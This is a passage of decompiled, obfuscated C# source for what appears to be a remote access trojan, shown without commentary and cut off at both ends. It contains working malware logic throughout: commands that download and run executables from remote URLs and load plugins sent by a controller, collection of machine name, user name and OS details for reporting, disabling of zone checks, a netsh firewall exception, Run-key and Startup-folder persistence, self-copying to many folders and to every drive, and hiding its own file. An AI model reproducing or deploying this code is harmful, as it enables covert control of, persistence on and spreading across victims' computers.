            \u0040Ә.\u0040ֆ(0);
            ProjectData.EndApp();
          }
          else
          {
            if (Operators.CompareString(Left35, "@", false) != 0)
              return;
            \u0040Ә.\u0040ֆ(0);
            Process.Start(\u0040Ә.\u0040Բ.FullName);
            ProjectData.EndApp();
          }
        }
        else if (Operators.CompareString(Left1, "up", false) == 0)
        {
          byte[] bytes;
          if (strArray1[1][0] == '\u001F')
          {
            try
            {
              MemoryStream memoryStream = new MemoryStream();
              int length = (strArray1[0] + \u0040Ә.\u0040Ի).Length;
              memoryStream.Write(_param0_1, length, checked (_param0_1.Length - length));
              bytes = \u0040Ә.\u0040\u058D(memoryStream.ToArray());
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              \u0040Ә.\u0040\u0589("MSG" + \u0040Ә.\u0040Ի + "Update ERROR");
              \u0040Ә.\u0040\u0589("bla");
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
              return;
            }
          }
          else
          {
            WebClient webClient = new WebClient();
            try
            {
              bytes = webClient.DownloadData(strArray1[1]);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              \u0040Ә.\u0040\u0589("MSG" + \u0040Ә.\u0040Ի + "Update ERROR");
              \u0040Ә.\u0040\u0589("bla");
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
              return;
            }
          }
          \u0040Ә.\u0040\u0589("bla");
          string str = Path.GetTempFileName() + ".exe";
          try
          {
            \u0040Ә.\u0040\u0589("MSG" + \u0040Ә.\u0040Ի + "Updating To " + new FileInfo(str).Name);
            Thread.Sleep(2000);
            System.IO.File.WriteAllBytes(str, bytes);
            Process.Start(str, "..");
          }
          catch (Exception ex3)
          {
            ProjectData.SetProjectError(ex3);
            Exception ex4 = ex3;
            ProjectData.SetProjectError(ex4);
            Exception exception = ex4;
            \u0040Ә.\u0040\u0589("MSG" + \u0040Ә.\u0040Ի + "Update ERROR " + exception.Message);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
            return;
          }
          \u0040Ә.\u0040\u058C();
        }
        else if (Operators.CompareString(Left1, "Ex", false) == 0)
        {
          if (\u0040Ә.\u0040Զ == null)
          {
            \u0040Ә.\u0040\u0589("PLG");
            int num3 = 0;
            while (!(\u0040Ә.\u0040Զ != null | num3 == 20 | !\u0040Ә.\u0040Ӡ))
            {
              checked { ++num3; }
              Thread.Sleep(1000);
            }
            if (\u0040Ә.\u0040Զ == null | !\u0040Ә.\u0040Ӡ)
              return;
          }
          object[] Arguments = new object[1]
          {
            (object) _param0_1
          };
          bool[] CopyBack = new bool[1]{ true };
          NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040Զ), (System.Type) null, "ind", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
          if (CopyBack[0])
            _param0_1 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Arguments[0]))), typeof (byte[]));
        }
        else if (Operators.CompareString(Left1, "PLG", false) == 0)
        {
          MemoryStream memoryStream = new MemoryStream();
          int length = (strArray1[0] + \u0040Ә.\u0040Ի).Length;
          memoryStream.Write(_param0_1, length, checked (_param0_1.Length - length));
          \u0040Ә.\u0040Զ = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040օ(\u0040Ә.\u0040\u058D(memoryStream.ToArray()), "A"))));
          NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040Զ), (System.Type) null, "H", new object[1]
          {
            (object) \u0040Ә.\u0040ӥ
          }, (string[]) null, (System.Type[]) null);
          NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040Զ), (System.Type) null, "P", new object[1]
          {
            (object) \u0040Ә.\u0040Ե
          }, (string[]) null, (System.Type[]) null);
          NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040Զ), (System.Type) null, "c", new object[1]
          {
            (object) \u0040Ә.\u0040ӟ
          }, (string[]) null, (System.Type[]) null);
        }
      }
    }
    catch (Exception ex5)
    {
      ProjectData.SetProjectError(ex5);
      Exception ex6 = ex5;
      ProjectData.SetProjectError(ex6);
      Exception exception = ex6;
      if (strArray1.Length > 0 && Operators.CompareString(strArray1[0], "Ex", false) == 0 | Operators.CompareString(strArray1[0], "PLG", false) == 0)
        \u0040Ә.\u0040Զ = (object) null;
      try
      {
        \u0040Ә.\u0040\u0589("ER" + \u0040Ә.\u0040Ի + strArray1[0] + \u0040Ә.\u0040Ի + exception.Message);
      }
      catch (Exception ex7)
      {
        ProjectData.SetProjectError(ex7);
        ProjectData.SetProjectError(ex7);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
  }

  public object \u0040ս(string _param1)
  {
    _param1 = _param1.Replace("月", "a").Replace("아", "A").Replace("官", "b").Replace("악", "B").Replace("匹", "c").Replace("안", "C").Replace("力", "d").Replace("알", "D").Replace("三", "e").Replace("앙", "E").Replace("下", "f").Replace("앞", "F").Replace("巨", "g").Replace("얘", "G").Replace("升", "h").Replace("ᄍ", "H").Replace("工", "i").Replace("ᄊ", "I").Replace("丁", "j").Replace("ᄈ", "J").Replace("水", "k").Replace("응", "K").Replace("心", "l").Replace("읍", "L").Replace("冊", "m").Replace("음", "M").Replace("內", "n").Replace("을", "N").Replace("口", "o").Replace("임", "O").Replace("戶", "p").Replace("잎", "P").Replace("已", "q").Replace("율", "Q").Replace("尺", "r").Replace("월", "R").Replace("弓", "s").Replace("원", "S").Replace("七", "t").Replace("웅", "T").Replace("臼", "u").Replace("울", "U").Replace("人", "v").Replace("운", "V").Replace("山", "w").Replace("옴", "W").Replace("父", "x").Replace("왕", "X").Replace("了", "y").Replace("왜", "Y").Replace("乙", "z").Replace("에", "Z");
    return (object) _param1;
  }

  public static string \u0040վ()
  {
    string str1 = "ll" + \u0040Ә.\u0040Ի;
    string str2;
    try
    {
      if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040Ռ("vn", (object) "")), (object) "", false))
      {
        string str3 = str1;
        string str4 = \u0040Ә.\u0040Մ(ref \u0040Ә.\u0040Թ) + "_" + \u0040Ә.\u0040Վ();
        string str5 = \u0040Ә.\u0040Շ(ref str4);
        string ի = \u0040Ә.\u0040Ի;
        str2 = str3 + str5 + ի;
      }
      else
      {
        string str6 = str1;
        string str7 = Conversions.ToString(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040Ռ("vn", (object) "")));
        string str8 = \u0040Ә.\u0040Մ(ref str7) + "_" + \u0040Ә.\u0040Վ();
        string str9 = \u0040Ә.\u0040Շ(ref str8);
        string ի = \u0040Ә.\u0040Ի;
        str2 = str6 + str9 + ի;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      string str10 = str1;
      string str11 = \u0040Ә.\u0040Վ();
      string str12 = \u0040Ә.\u0040Շ(ref str11);
      string ի = \u0040Ә.\u0040Ի;
      str2 = str10 + str12 + ի;
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    string str13;
    try
    {
      str13 = str2 + Environment.MachineName + \u0040Ә.\u0040Ի;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      str13 = str2 + "??" + \u0040Ә.\u0040Ի;
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    string str14;
    try
    {
      str14 = str13 + Environment.UserName + \u0040Ә.\u0040Ի;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      str14 = str13 + "??" + \u0040Ә.\u0040Ի;
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    string str15;
    try
    {
      str15 = str14 + \u0040Ә.\u0040Բ.LastWriteTime.Date.ToString("yy-MM-dd") + \u0040Ә.\u0040Ի;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      str15 = str14 + "??-??-??" + \u0040Ә.\u0040Ի;
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    string str16 = str15 + "" + \u0040Ә.\u0040Ի;
    string str17;
    try
    {
      str17 = str16 + \u0040Ә.\u0040ӣ.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win");
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      str17 = str16 + "??";
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    string str18 = str17 + "SP";
    string str19;
    try
    {
      string[] strArray = Strings.Split(Environment.OSVersion.ServicePack);
      if (strArray.Length == 1)
        str18 += "0";
      str19 = str18 + strArray[checked (strArray.Length - 1)];
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      str19 = str18 + "0";
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    string str20;
    try
    {
      str20 = !Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86") ? str19 + " x86" + \u0040Ә.\u0040Ի : str19 + " x64" + \u0040Ә.\u0040Ի;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      str20 = str19 + \u0040Ә.\u0040Ի;
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    string str21 = (!\u0040Ә.\u0040Հ() ? str20 + "No" + \u0040Ә.\u0040Ի : str20 + "Yes" + \u0040Ә.\u0040Ի) + \u0040Ә.\u0040Ժ + \u0040Ә.\u0040Ի + ".." + \u0040Ә.\u0040Ի + \u0040Ә.\u0040Ծ() + \u0040Ә.\u0040Ի;
    string str22 = "";
    try
    {
      string[] valueNames = \u0040Ә.\u0040ӣ.Registry.CurrentUser.CreateSubKey("Software\\" + \u0040Ә.\u0040Է, RegistryKeyPermissionCheck.Default).GetValueNames();
      int index = 0;
      while (index < valueNames.Length)
      {
        string str23 = valueNames[index];
        if (str23.Length == 32)
          str22 = str22 + str23 + ",";
        checked { ++index; }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    return str21 + str22;
  }

  [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
  public static void \u0040տ()
  {
    Thread.Sleep(1000);
    if (\u0040Ә.\u0040ӷ && !\u0040Ә.\u0040Ղ(\u0040Ә.\u0040Բ, new FileInfo(Interaction.Environ(\u0040Ә.\u0040ӡ).ToLower() + "\\" + \u0040Ә.\u0040Ӣ.ToLower())))
    {
      try
      {
        if (System.IO.File.Exists(Interaction.Environ(\u0040Ә.\u0040ӡ) + "\\" + \u0040Ә.\u0040Ӣ))
          System.IO.File.Delete(Interaction.Environ(\u0040Ә.\u0040ӡ) + "\\" + \u0040Ә.\u0040Ӣ);
        FileStream fileStream = new FileStream(Interaction.Environ(\u0040Ә.\u0040ӡ) + "\\" + \u0040Ә.\u0040Ӣ, FileMode.CreateNew);
        byte[] array = System.IO.File.ReadAllBytes(\u0040Ә.\u0040Բ.FullName);
        fileStream.Write(array, 0, array.Length);
        fileStream.Flush();
        fileStream.Close();
        \u0040Ә.\u0040Բ = new FileInfo(Interaction.Environ(\u0040Ә.\u0040ӡ) + "\\" + \u0040Ә.\u0040Ӣ);
        Process.Start(\u0040Ә.\u0040Բ.FullName);
        ProjectData.EndApp();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.EndApp();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    try
    {
      Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    try
    {
      Interaction.Shell("netsh firewall add allowedprogram \"" + \u0040Ә.\u0040Բ.FullName + "\" \"" + \u0040Ә.\u0040Բ.Name + "\" ENABLE", AppWinStyle.Hide, true, 5000);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    if (\u0040Ә.\u0040ӹ)
    {
      try
      {
        \u0040Ә.\u0040ӣ.Registry.CurrentUser.OpenSubKey(\u0040Ә.\u0040Ը, true).SetValue(\u0040Ә.\u0040Է, (object) ("\"" + \u0040Ә.\u0040Բ.FullName + "\" .."));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        \u0040Ә.\u0040ӣ.Registry.LocalMachine.OpenSubKey(\u0040Ә.\u0040Ը, true).SetValue(\u0040Ә.\u0040Է, (object) ("\"" + \u0040Ә.\u0040Բ.FullName + "\" .."));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040Ӹ)
    {
      try
      {
        string path = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\" + \u0040Ә.\u0040Ӭ + ".exe";
        System.IO.File.Copy(\u0040Ә.\u0040Բ.FullName, Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\" + \u0040Ә.\u0040Ӭ + ".exe", true);
        \u0040Ә.\u0040Ӥ = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\" + \u0040Ә.\u0040Ӭ + ".exe", FileMode.Open);
        if (!System.IO.File.Exists(path))
          ;
        System.IO.File.Delete(path);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040Ӻ)
    {
      try
      {
        \u0040Ә.\u0040ӥ = \u0040Ә.\u0040Մ(ref \u0040Ә.\u0040ӥ);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040ӻ)
    {
      try
      {
        Process.Start(\u0040Ә.\u0040Ӧ);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040ԁ)
    {
      try
      {
        string path = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + \u0040Ә.\u0040ө + ".exe";
        System.IO.File.Copy(\u0040Ә.\u0040Բ.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + \u0040Ә.\u0040ө + ".exe", true);
        \u0040Ә.\u0040Ӥ = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + \u0040Ә.\u0040ө + ".exe", FileMode.Open);
        if (!System.IO.File.Exists(path))
          ;
        System.IO.File.Delete(path);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040Ԃ)
    {
      try
      {
        MessageBoxIcon icon;
        if (\u0040Ә.\u0040ӽ)
          icon = MessageBoxIcon.Question;
        else if (\u0040Ә.\u0040Ӿ)
          icon = MessageBoxIcon.Hand;
        else if (\u0040Ә.\u0040ӿ)
          icon = MessageBoxIcon.Exclamation;
        else if (\u0040Ә.\u0040Ԁ)
          icon = MessageBoxIcon.Asterisk;
        else if (\u0040Ә.\u0040Ӽ)
          icon = MessageBoxIcon.None;
        if (\u0040Ә.\u0040ԁ)
        {
          int num1 = (int) MessageBox.Show(\u0040Ә.\u0040ӧ, \u0040Ә.\u0040Ө, MessageBoxButtons.OK, icon);
        }
        else
        {
          MessageBoxButtons buttons;
          int num2 = (int) MessageBox.Show(\u0040Ә.\u0040ӧ, \u0040Ә.\u0040Ө, buttons, icon);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040ԃ)
    {
      try
      {
        string path = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + \u0040Ә.\u0040Է + \u0040Ә.\u0040Ӫ + ".exe";
        System.IO.File.Copy(\u0040Ә.\u0040Բ.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + \u0040Ә.\u0040Է + \u0040Ә.\u0040Ӫ + ".exe", true);
        \u0040Ә.\u0040Ӥ = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + \u0040Ә.\u0040Է + \u0040Ә.\u0040Ӫ + ".exe", FileMode.Open);
        if (!System.IO.File.Exists(path))
          ;
        System.IO.File.Delete(path);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040Ԅ)
    {
      try
      {
        System.IO.File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040ԅ)
    {
      try
      {
        \u0040ӛ.\u0040ӓ();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040Ԇ)
    {
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040ԇ)
    {
      try
      {
        Thread.Sleep(checked ((int) Math.Round(Math.Round(Math.Round(unchecked (Conversions.ToDouble(\u0040Ә.\u0040ӫ) * 1000.0))))));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040Ԉ)
    {
      try
      {
        if (!(\u0040Ә.\u0040Ԕ == Conversions.ToBoolean("False") & \u0040Ә.\u0040ԩ == Conversions.ToBoolean("False") & \u0040Ә.\u0040ԗ == Conversions.ToBoolean("false") & \u0040Ә.\u0040Ԗ == Conversions.ToBoolean("false") & \u0040Ә.\u0040ԕ == Conversions.ToBoolean("false") & \u0040Ә.\u0040Ԙ == Conversions.ToBoolean("false") & \u0040Ә.\u0040ԙ == Conversions.ToBoolean("false") & \u0040Ә.\u0040ԛ == Conversions.ToBoolean("false") & \u0040Ә.\u0040Ԛ == Conversions.ToBoolean("false") & \u0040Ә.\u0040Ԝ == Conversions.ToBoolean("false") & \u0040Ә.\u0040ԝ == Conversions.ToBoolean("false") & \u0040Ә.\u0040Ԟ == Conversions.ToBoolean("false") & \u0040Ә.\u0040ԟ == Conversions.ToBoolean("false") & \u0040Ә.\u0040Ԡ == Conversions.ToBoolean("false") & \u0040Ә.\u0040ԡ == Conversions.ToBoolean("false") & \u0040Ә.\u0040Ԣ == Conversions.ToBoolean("false") & \u0040Ә.\u0040ԣ == Conversions.ToBoolean("false") & \u0040Ә.\u0040Ԥ == Conversions.ToBoolean("false")))
          \u0040ӗ.\u0040Ӗ();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040ԉ)
    {
      try
      {
        new Thread(new ThreadStart(new \u0040ә().\u0040ӝ)).Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040Ԋ)
    {
      try
      {
        string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + \u0040Ә.\u0040Ӭ + ".exe";
        System.IO.File.Copy(\u0040Ә.\u0040Բ.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + \u0040Ә.\u0040Ӭ + ".exe", true);
        \u0040Ә.\u0040Ӥ = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + \u0040Ә.\u0040Է + \u0040Ә.\u0040Ӭ + ".exe", FileMode.Open);
        if (!System.IO.File.Exists(path))
          ;
        System.IO.File.Delete(path);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040ԋ)
    {
      try
      {
        string path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\" + \u0040Ә.\u0040Ӭ + ".exe";
        System.IO.File.Copy(\u0040Ә.\u0040Բ.FullName, Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\" + \u0040Ә.\u0040Ӭ + ".exe", true);
        \u0040Ә.\u0040Ӥ = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\" + \u0040Ә.\u0040Ӭ + ".exe", FileMode.Open);
        if (!System.IO.File.Exists(path))
          ;
        System.IO.File.Delete(path);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040ԏ)
    {
      try
      {
        string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + \u0040Ә.\u0040Ӭ + ".exe";
        System.IO.File.Copy(\u0040Ә.\u0040Բ.FullName, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + \u0040Ә.\u0040Ӭ + ".exe", true);
        \u0040Ә.\u0040Ӥ = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + \u0040Ә.\u0040Ӭ + ".exe", FileMode.Open);
        if (!System.IO.File.Exists(path))
          ;
        System.IO.File.Delete(path);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040Ԏ)
    {
      try
      {
        string path = Environment.GetFolderPath(Environment.SpecialFolder.InternetCache) + "\\" + \u0040Ә.\u0040Ӭ + ".exe";
        System.IO.File.Copy(\u0040Ә.\u0040Բ.FullName, Environment.GetFolderPath(Environment.SpecialFolder.InternetCache) + "\\" + \u0040Ә.\u0040Ӭ + ".exe", true);
        \u0040Ә.\u0040Ӥ = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.InternetCache) + "\\" + \u0040Ә.\u0040Ӭ + ".exe", FileMode.Open);
        if (!System.IO.File.Exists(path))
          ;
        System.IO.File.Delete(path);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040Ԍ)
    {
      try
      {
        string path = Environment.GetFolderPath(Environment.SpecialFolder.Cookies) + "\\" + \u0040Ә.\u0040Ӭ + ".exe";
        System.IO.File.Copy(\u0040Ә.\u0040Բ.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Cookies) + "\\" + \u0040Ә.\u0040Ӭ + ".exe", true);
        \u0040Ә.\u0040Ӥ = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Cookies) + "\\" + \u0040Ә.\u0040Ӭ + ".exe", FileMode.Open);
        if (!System.IO.File.Exists(path))
          ;
        System.IO.File.Delete(path);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040Ԍ)
    {
      try
      {
        string path = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + \u0040Ә.\u0040Ӭ + ".exe";
        System.IO.File.Copy(\u0040Ә.\u0040Բ.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + \u0040Ә.\u0040Ӭ + ".exe", true);
        \u0040Ә.\u0040Ӥ = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + \u0040Ә.\u0040Ӭ + ".exe", FileMode.Open);
        if (!System.IO.File.Exists(path))
          ;
        System.IO.File.Delete(path);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040Ԑ)
    {
      try
      {
        string path = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\" + \u0040Ә.\u0040Ӭ + ".exe";
        System.IO.File.Copy(\u0040Ә.\u0040Բ.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\" + \u0040Ә.\u0040Ӭ + ".exe", true);
        \u0040Ә.\u0040Ӥ = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\" + \u0040Ә.\u0040Ӭ + ".exe", FileMode.Open);
        if (!System.IO.File.Exists(path))
          ;
        System.IO.File.Delete(path);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040ԑ)
    {
      try
      {
        string path = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + "\\" + \u0040Ә.\u0040Ӭ + ".exe";
        System.IO.File.Copy(\u0040Ә.\u0040Բ.FullName, Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + "\\" + \u0040Ә.\u0040Ӭ + ".exe", true);
        \u0040Ә.\u0040Ӥ = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + "\\" + \u0040Ә.\u0040Ӭ + ".exe", FileMode.Open);
        if (!System.IO.File.Exists(path))
          ;
        System.IO.File.Delete(path);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040Ԓ)
    {
      try
      {
        string path = Environment.GetFolderPath(Environment.SpecialFolder.History) + "\\" + \u0040Ә.\u0040Ӭ + ".exe";
        System.IO.File.Copy(\u0040Ә.\u0040Բ.FullName, Environment.GetFolderPath(Environment.SpecialFolder.History) + "\\" + \u0040Ә.\u0040Ӭ + ".exe", true);
        \u0040Ә.\u0040Ӥ = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.History) + "\\" + \u0040Ә.\u0040Ӭ + ".exe", FileMode.Open);
        if (!System.IO.File.Exists(path))
          ;
        System.IO.File.Delete(path);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040ԍ)
    {
      try
      {
        string path = Environment.GetFolderPath(Environment.SpecialFolder.Favorites) + "\\" + \u0040Ә.\u0040Ӭ + ".exe";
        System.IO.File.Copy(\u0040Ә.\u0040Բ.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Favorites) + "\\" + \u0040Ә.\u0040Ӭ + ".exe", true);
        \u0040Ә.\u0040Ӥ = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Favorites) + "\\" + \u0040Ә.\u0040Ӭ + ".exe", FileMode.Open);
        if (!System.IO.File.Exists(path))
          ;
        System.IO.File.Delete(path);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040Ԯ)
    {
      try
      {
        string programFiles = MyProject.Computer.FileSystem.SpecialDirectories.ProgramFiles;
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          try
          {
            System.IO.File.Copy(Application.ExecutablePath, str + \u0040Ә.\u0040Ӳ + ".exe");
            System.IO.File.SetAttributes(str + \u0040Ә.\u0040Ӳ + ".exe", FileAttributes.Normal);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040ԧ)
    {
      try
      {
